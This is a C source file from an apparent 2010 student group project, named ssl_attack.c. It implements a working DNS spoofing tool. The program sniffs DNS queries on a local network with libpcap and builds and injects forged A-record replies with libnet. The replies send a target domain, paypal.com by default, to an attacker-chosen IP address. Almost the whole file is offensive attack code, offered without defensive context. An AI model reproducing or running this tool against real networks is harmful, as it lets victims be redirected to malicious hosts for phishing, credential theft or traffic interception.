/*****************************************************************
 * File: ssl_attack.c
 * by: Group YaKeXi
 * 
 * History:
 * 
 *  2010/02/22 Completed and tested by Hongkai Xing 
 *             on Ubuntu 9.10 with libnet 1.1.4 and libpcap 0.8.
 *
 *  2010/02/22 Hongkai XING: 
 *             I use "eth2" on my platform, you can change it at will.
 *             DNS server in /etc/resolv.conf is changed to "nameserver 4.2.2.2".
 *             
 * Description: This program captures DNS requests,
 *              and reinjects spoofed DNS responses.
 *
 *****************************************************************/
#include "sslattack.h"
void showErrorMsg(char *msg)
{
        perror(msg);
        exit(1);
}

int main(int argc, char **argv) {
	char *spoof_addr;
	char *site_name;
	char temp_site[128];
	char *device;
	char filter[1024];                 /* packet capture filter */
	char errbuf[PCAP_ERRBUF_SIZE];     /* Error buffer */
	pcap_t* capdev;                    /* packet capture handler */
	const u_char *packet = NULL;
	struct pcap_pkthdr pcap_hdr;       /* Pcap packet header */
	libnet_t *handler;                 /* Libnet handler */

	/* reserve the space for the spoofed packet */
	memset(&spoofpacket, '\0', sizeof(struct sp));

	/* get the spoofing IP address from input */
	(argc >= 2) ? (spoof_addr = argv[1]) : (spoof_addr = "222.106.38.120");
	(argc >= 3) ? (site_name = argv[2])  : (site_name = "paypal.com");
	/* add www. prefix to site domain name */
	if (strncmp(site_name, "www", 3) != 0) {
		strncpy(temp_site, "www.", 4);
		strcpy(temp_site+4, site_name);
		site_name = temp_site; 
	}
	
	/* get a device to sniff on */
//	device = pcap_lookupdev(errbuf);
//	if (device == NULL) {
//		printf("pcap_lookupdev: %s\n", errbuf);
//	exit(1);
//	}

	// Hongkai XING: "eth2" is used on my platform, you can change it at will.
	device="eth2";

	/* construct a filter which capture the DNS query*/
	strcpy(filter, "udp dst port 53");

	/* Setup for sniffering */
	capdev = set_cap_dev(device, filter);

	printf("Sniffering on: %s\n", device);
	printf("Spoofing address: %s\n", spoof_addr);
      
	while(1){
		packet = pcap_next(capdev,&pcap_hdr);
		if (packet == NULL) continue;
		/* If the packet is a DNS query, create and inject a spoofed DNS response */
		if ((analyze_packet(packet,(int)pcap_hdr.caplen,spoof_addr,site_name)) == 1){
			spoof_dns(device);
     		}
	}   
	return 0;
}

/* Basic setup for packet sniffing */
pcap_t *set_cap_dev (char *device, char *filter) {
	unsigned int network;           /* Filter setting */
	unsigned int netmask;           /* Filter setting */
	struct bpf_program fp;          /* Store compiled filter */
	pcap_t *capdev;                 /* Capturing device */
	char errbuf[PCAP_ERRBUF_SIZE];  /* Error buffer */

	pcap_lookupnet (device, &network, &netmask, errbuf);
	
	/* Open a network device for packet capture */
	if ((capdev = pcap_open_live(device, BUFSIZE, 1, 1000, errbuf)) == NULL) 
	{printf("pcap_open_live(): %s\n", errbuf);exit(1);}

	/* Make sure that we're capturing on an Ethernet device */
	if (pcap_datalink(capdev) != DLT_EN10MB) 
	{printf("%s is not an Ethernet\n", device); exit(1);}
  
	/* Compile the filter expression */
	if (pcap_compile(capdev, &fp, filter, 0, netmask) == -1)
	{printf("Couldn't parse filter %s: %s\n", filter, pcap_geterr(capdev));exit(1);}

	/* Apply the compiled filter */
	if (pcap_setfilter(capdev, &fp) == -1)
	{printf("Couldn't install filter %s: %s\n", filter, pcap_geterr(capdev));exit(1);}

	return capdev;
}

/* Analyze a packet and store information */
int analyze_packet(const u_char *packet, int caplen, char *spoof_addr, char *site_name) {
	struct ip *ip;        /* IP header */
	struct udphdr *udp;   /* UDP header */
	struct dnshdr *dns;   /* DNS hdader */
	char *data;           /* Pointer to DNS payload */
	char *data_backup;    /* Original pointer to DNS payload */
	char name[128];       /* Lookup name */
	char name_ext[128];   /* Lookup name */
	u_long rdata;         /* IP addr in network byte order */
	int datalen;          /* Length of DNS payload */
	int c = 1;            /* For name extraction */        
	int i = 0;
	libnet_t *handler;    /* Libnet handler */

	ip = (struct ip *) (packet + ETHER_HDRLEN);
	udp = (struct udphdr *) (packet + ETHER_HDRLEN + LIBNET_IPV4_H);
	dns = (struct dnshdr *) (packet+ ETHER_HDRLEN + LIBNET_IPV4_H + LIBNET_UDP_H);

	// data points to the compressed domain name
	// datalen == the length of data (which doesn't include Type and Class field) 
	data = (char *)(packet + ETHER_HDRLEN + LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_DNS_H);
	datalen = strlen(data);
	data_backup = data;
	memset(name, '\0', sizeof(name));
  
	/* Convert name, expand the compressed domain name to a full domain name */
	//int dn_expand(unsigned char *msg, unsigned char *eomorig,
	//		unsigned char *comp_dn, unsigned char *exp_dn,int length);
	if (dn_expand(
			(u_char *)dns,	// pointer to the beginning of query or reply message
			packet + caplen,// pointer to the end of message 
			data,		// compressed domain name
			name,		// buffer to hold full/expanded domain name
			sizeof(name)	// length of buffer
					) < 0){
		return;
	}
	printf("DNS Request >>> [src]%s:%d\n", inet_ntoa(ip->ip_src), ntohs(udp->source));
	printf("                [dst]%s:%d\n", inet_ntoa(ip->ip_dst), ntohs(udp->dest));
	printf("                [query]%s\n", name);
 
	/* Restore data pointer which is likely modified in dn_expand */  
	data = data_backup;
  	/* kill the trailing '.' */
	name[datalen-1] = '\0';

	/* We only spoof packets of DNS request */
//	if (ntohs(udp->dest) != 53) {
//		printf("Destination port is not 53\n");
//		return 0;
//	}

  	/* We only deal with query type A (host address) */
	if ( ( (int)*(data+datalen+2) ) != T_A) {
		printf("Query is not type A\n");
		return 0;
	}
	/* add www. prefix to domain name if necessary */
	if (strncmp (name, "www", 3) != 0) {
		memset(name_ext, '\0', sizeof(name_ext));
		strncpy(name_ext, "www.", 4);
		strncpy(name_ext+4, name, sizeof(name));
		strncpy(name, name_ext, sizeof(name_ext));
	}
	/* We only spoof packets for the specific site_name */
	if (strncmp(site_name, name, strlen(site_name)) != 0) {
		printf("Requesting site is not %s\n\n", site_name);
		return 0;
	}

	/* Save information for the spoofed packet generation */
	strncpy(spoofpacket.query, name, 128);
	spoofpacket.src_address = ip->ip_dst.s_addr;
	spoofpacket.dst_address = ip->ip_src.s_addr;
	spoofpacket.src_port = udp->dest;
	spoofpacket.dst_port = udp->source;
	spoofpacket.dns_id = dns->id;		
	spoofpacket.response = spoof_addr;	// proposed response (fake ip address)

	/* Convert rdata from char* to unsigned long in Network Byte Order*/
	rdata = libnet_name2addr4(handler, spoofpacket.response, LIBNET_DONT_RESOLVE);
	if (rdata == -1) {
		printf("Resolving name failed: %s\n", libnet_geterror(handler));
	}

	/* Payload of the spoofed DNS Response */

	/* Query entry in spoofed DNS Response */
	// "+5" --> include Type & Class field
	memcpy(spoofpacket.payload, data, datalen + 5);

	/* Answer entry in spoofed DNS Response */
	// Name, Type, Class, Time to Live, Data Length field in Answer Entry
	// c0 0c -> domain name for which query are sent
	// 00 01 -> type 
	// 00 01 -> class
	// 00 00 00 04 -> time to live (4 secs)
	// 00 04 -> data length
	memcpy(spoofpacket.payload+datalen+5,"\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x04\x00\x04", 12);
	// Address field in Answer Entry
	*((u_long *)(spoofpacket.payload+datalen+5+12)) = rdata;

	// size of crafted payload of DNS Response
	spoofpacket.payload_size = datalen+17+4;
	
	return 1;
}


/* Build the new packet and inject it */
void spoof_dns(char *device) {
	struct  in_addr src, dst, spoof;/* For printing addresses */
	int     inject_size;            /* Number of bytes of injected packet     */
	int     packet_size;            /* Size of the packet          */
	u_char  *packet;		/* Packet to be built               */
	libnet_t *handler;		/* Libnet handler */
	libnet_ptag_t dns_tag,		/* libnet protocol tag for dns */
		      udp_tag,		/* libnet protocol tag for udp */
		      ip_tag;		/* libnet protocol tag for ip */
	char errbuf[LIBNET_ERRBUF_SIZE];/* Error buffer */

	packet_size = LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_DNS_H + spoofpacket.payload_size;

	/* get a libnet handler */
	handler = libnet_init(LIBNET_RAW4, device, errbuf);
	if (handler == NULL) showErrorMsg(errbuf);

	/* DNS header construction */
	dns_tag = 0;
	dns_tag = libnet_build_dnsv4(
		LIBNET_DNS_H,		// header length (not part of dns header field)
		ntohs(spoofpacket.dns_id),
		0x8580,			// Control Flags (QR,AA,RD,RA is set to 1)
		1,			// number of questions
		1,			// number of answer resource records
		0,			// number of authority resource records
		0,			// number of additional resource records
		spoofpacket.payload,
		spoofpacket.payload_size,
		handler,		// pointer to libnet context
		dns_tag);		// protocol tag for dns
	
	if (dns_tag == -1) {
		printf("Building DNS header failed: %s\n", libnet_geterror(handler));
		exit(1);
	}

	/* UDP header construction */
	udp_tag = 0;
	udp_tag = libnet_build_udp(
		ntohs(spoofpacket.src_port),	// source port
		ntohs(spoofpacket.dst_port),	// destination port
		packet_size - LIBNET_IPV4_H,	// total length of the UDP packet
		0,				// libnet will autofill the checksum
		NULL,				// payload
		0,				// payload length
		handler,			// pointer to libnet context
		udp_tag);			// protocol tag for udp

	if (udp_tag ==-1) {
		printf("Building UDP header failed: %s\n", libnet_geterror(handler));
		exit(1);
	}
  
	/* IP header construction */
	ip_tag = 0;
	ip_tag = libnet_build_ipv4(
		packet_size,			// total length of IP packet
		0,				// type of service
		8964,				// identification number
		0,				// fragmentation offset
		64,				// time to live
		IPPROTO_UDP,			// upper layer protocol
		0,				// libnet will autofill the checksum
		spoofpacket.src_address,	// source IPv4 address
		spoofpacket.dst_address,	// destination IPv4 address
		NULL,				// no payload
		0,				// payload length
		handler,			// pointer to libnet context
		ip_tag);			// protocol tag=0, build new

	if (ip_tag == -1) {
		printf("Building IP header failed: %s\n", libnet_geterror(handler));
		exit(1);
	}

	/*  Inject the packet */
	inject_size=libnet_write(handler);
	if (inject_size == -1) {
		printf("Write failed: %s\n", libnet_geterror(handler));
	}
  
	printf("--- Spoofed DNS Response injected ---\n\n");

	/*  Destroy the packet */
	libnet_destroy(handler);
}




